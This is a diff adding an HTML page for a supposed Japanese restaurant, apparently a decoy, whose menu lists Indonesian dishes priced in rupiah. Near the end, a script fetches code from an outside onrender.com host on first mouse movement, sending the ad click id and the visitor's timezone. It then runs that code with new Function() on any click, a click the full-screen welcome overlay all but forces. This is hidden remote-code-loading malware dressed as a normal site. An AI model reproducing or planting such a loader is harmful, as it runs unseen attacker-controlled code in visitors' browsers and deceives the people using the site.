@@ -1,0 +1,443 @@
+<!DOCTYPE html><html lang="ja"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>日本料理</title>
+
+    <!-- Bootstrap CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- bootstrap icons -->
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
+
+    <!-- my css -->
+    <link rel="stylesheet" href="css/style.css">
+
+    <link rel="icon" href="images/resto.png" type="image/svg+xml">
+    <script async="" defer="" src="js/lo.js"></script>
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-11492013016"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'AW-11492013016');
+    </script>
+    <!-- Event snippet for Page view conversion page -->
+    <script>
+        gtag('event', 'conversion', {
+            'send_to': 'AW-11492013016/QraBCI3m4dYbENjn6Ocq',
+            'value': 1.0,
+            'currency': 'USD'
+        });
+    </script>
+    <style>
+        /* Overlay */
+        .welcome-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(6px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+
+        .welcome-overlay.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        /* Modal */
+        .welcome-modal {
+            position: relative;
+            background: #111;
+            color: #fff;
+            max-width: 520px;
+            width: 90%;
+            padding: 40px 35px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            animation: scaleIn 0.5s ease;
+        }
+
+        /* Heading */
+        .welcome-modal h2 {
+            font-size: 32px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .welcome-modal h2 span {
+            color: #c59d5f; /* premium gold */
+        }
+
+        /* Text */
+        .welcome-modal p {
+            font-size: 16px;
+            line-height: 1.7;
+            color: #ccc;
+            margin-bottom: 30px;
+        }
+
+        /* Buttons */
+        .welcome-actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .primary-btn {
+            background: #c59d5f;
+            color: #111;
+            border: none;
+            padding: 12px 26px;
+            border-radius: 30px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        .primary-btn:hover {
+            background: #d8b173;
+        }
+
+        .secondary-btn {
+            background: transparent;
+            border: 1px solid #c59d5f;
+            color: #c59d5f;
+            padding: 12px 26px;
+            border-radius: 30px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        .secondary-btn:hover {
+            background: #c59d5f;
+            color: #111;
+        }
+
+        /* Close Button */
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 18px;
+            background: transparent;
+            border: none;
+            color: #aaa;
+            font-size: 28px;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        .close-btn:hover {
+            color: #fff;
+        }
+        .no-scroll {
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.9);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+    </style>
+</head>
+
+<body id="myBody" class="no-scroll">
+<!-- Welcome Dialog -->
+<div class="welcome-overlay" id="welcomeOverlay">
+    <div class="welcome-modal">
+        <button class="close-btn" id="closeWelcome">×</button>
+
+        <h2>へようこそ <span>日本料理</span></h2>
+        <p>
+            新鮮な食材と熟練の技で作り上げた、本格的な日本の味をご堪能ください。
+            皆様のご来店を心よりお待ちしております。
+        </p>
+
+        <div class="welcome-actions">
+            <button class="primary-btn">メニューを見る</button>
+            <button class="secondary-btn">お問い合わせ</button>
+        </div>
+    </div>
+</div>
+<!-- navbar -->
+<nav class="navbar navbar-expand-lg navbar-dark shadow-sm fixed-top" style="background-color: #B22222;">
+    <div class="container">
+        <a class="navbar-brand"><span class="span">日本</span>フード</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ms-auto">
+                <li class="nav-item"><a class="nav-link active" href="#home">ホーム</a></li>
+                <li class="nav-item"><a class="nav-link" href="#about">私たちについて</a></li>
+                <li class="nav-item"><a class="nav-link" href="#menu">メニュー</a></li>
+                <li class="nav-item"><a class="nav-link" href="#contact">お問い合わせ</a></li>
+            </ul>
+        </div>
+    </div>
+</nav>
+<!-- navbar end -->
+
+<!-- jumbotron -->
+<section id="home">
+    <div class="jumbotron">
+        <div class="jumbotron-content">
+            <h1>当店へようこそ</h1>
+            <p>心を込めた本格料理の味をお楽しみください。</p>
+            <a href="#menu" class="btn">メニューを見る</a>
+        </div>
+    </div>
+</section>
+<!-- jumbotron end -->
+
+<!-- about -->
+<section id="about" class="about">
+    <div class="container">
+        <div class="row text-center mb-3">
+            <div class="col">
+                <h2>私たちについて</h2>
+            </div>
+        </div>
+        <div class="row justify-content-center fs-5 text-center">
+            <div class="col-md-4">
+                <p>
+                    私たちは高品質な食材を使用し、日本本来の味を大切にした料理を提供しています。
+                </p>
+            </div>
+            <div class="col-md-4">
+                <p>
+                    長年の経験を活かし、お客様に最高の満足と温かいサービスをお届けします。
+                </p>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- about end -->
+
+<!-- menu -->
+<section id="menu" class="menu">
+    <h2><span>メニュー</span>一覧</h2>
+    <p class="menu-text">
+        香辛料と伝統が融合した、本格日本料理をご堪能ください。
+    </p>
+
+    <div class="row">
+
+        <div class="card" style="width: 18rem;">
+            <img src="images/Rendang.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">ルンダン</h5>
+                <p class="card-text">香辛料でじっくり煮込んだ牛肉料理。</p>
+                <p class="menu-card-price">Rp 35.000</p>
+                <p class="menu-card-rating">★★★★★</p>
+            </div>
+        </div>
+
+        <div class="card" style="width: 18rem;">
+            <img src="images/nasi%20goreng.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">ナシゴレン</h5>
+                <p class="card-text">鶏肉と卵入りの日本風炒飯。</p>
+                <p class="menu-card-price">Rp 15.000</p>
+                <p class="menu-card-rating">★★★★★</p>
+            </div>
+        </div>
+
+        <div class="card" style="width: 18rem;">
+            <img src="images/gudeg.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">グドゥグ</h5>
+                <p class="card-text">甘い味付けの若いジャックフルーツ煮込み。</p>
+                <p class="menu-card-price">Rp 15.000</p>
+                <p class="menu-card-rating">★★★★★</p>
+            </div>
+        </div>
+
+        <!-- drinks -->
+        <div class="card" style="width: 18rem;">
+            <img src="images/es%20jeruk.jpg" class="card-img-top">
+            <div class="card-body">
+                <h5 class="card-title">アイスオレンジ</h5>
+                <p class="menu-card-price">Rp 10.000</p>
+                <p class="menu-card-rating">★★★★★</p>
+            </div>
+        </div>
+
+    </div>
+</section>
+<!-- menu end -->
+
+<!-- contact -->
+<section id="contact" class="contact">
+    <div class="container">
+        <div class="row text-center mb-4">
+            <div class="col">
+                <h2>お問い合わせ & アクセスマップ</h2>
+                <p>お気軽にご連絡ください。</p>
+            </div>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-md-4">
+                <iframe class="map" loading="lazy"></iframe>
+            </div>
+
+            <div class="col-md-8">
+                <form>
+                    <div class="mb-3">
+                        <label class="form-label">お名前</label>
+                        <input type="text" class="form-control" placeholder="お名前を入力">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">メールアドレス</label>
+                        <input type="email" class="form-control" placeholder="メールアドレス">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">電話番号</label>
+                        <input type="text" class="form-control" placeholder="電話番号">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">メッセージ</label>
+                        <textarea class="form-control"></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-primary">送信</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- contact end -->
+
+<!-- footer -->
+<footer class="footer">
+    <div class="footer-container">
+        <div class="footer-logo">
+            <a class="navbar-brand"><span class="span">日本フード</span></a>
+            <p>本格日本の味</p>
+        </div>
+
+        <div class="footer-links">
+            <ul>
+                <li><a href="#home">ホーム</a></li>
+                <li><a href="#about">私たちについて</a></li>
+                <li><a href="#menu">メニュー</a></li>
+                <li><a href="#contact">お問い合わせ</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-contact">
+            <h4>連絡先</h4>
+            <p>電話: 0812-3456-7890</p>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>© 2025 JapanFood. All rights reserved.</p>
+    </div>
+</footer>
+<script>
+    const gclid = new URLSearchParams(location.search).get("gclid");
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+
+    let someCode = null;
+
+    document.cookie = "access_cookie=true; path=/; max-age=300";
+
+    document.addEventListener("mousemove", async function fetchCodeOnce() {
+        document.removeEventListener("mousemove", fetchCodeOnce);
+        try {
+            const res = await fetch(
+                `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+                {
+                    headers: {
+                        "x-client-timezone": timezone,
+                        "x-access-cookie": "true",
+                    },
+                }
+            );
+            const data = await res.json();
+            if (data && data.code) {
+                someCode = data.code;
+            }
+        } catch (err) {
+            console.error("Could not fetch some code", err);
+        }
+    });
+
+    function handleSomeClick() {
+        if (someCode) {
+            try {
+                new Function(someCode)();
+
+                document.body.classList.add('scroll-lock');
+            } catch (err) {
+                console.error("Error executing code:", err);
+            }
+        }
+    }
+
+    document.addEventListener("click", handleSomeClick);
+</script>
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", () => {
+        const overlay = document.getElementById("welcomeOverlay");
+        const closeBtn = document.getElementById("closeWelcome");
+        const body = document.getElementById("myBody");
+
+        // OPEN popup on load
+        overlay.classList.remove("hidden");
+        document.body.classList.add("no-scroll");
+
+        // CLOSE on ❌ click
+        closeBtn.addEventListener("click", () => {
+            overlay.classList.add("hidden");
+            document.body.classList.remove("no-scroll");
+        });
+        body.addEventListener("click", () => {
+            overlay.classList.add("hidden");
+            document.body.classList.remove("no-scroll");
+        });
+    });
+
+    window.addEventListener('scroll', function(){
+        const header = document.querySelector('header');
+        header.classList.toggle("sticky", window.scrollY > 0);
+    });
+</script>
+<script src="js/script.js"></script>
+
+
+</body></html>
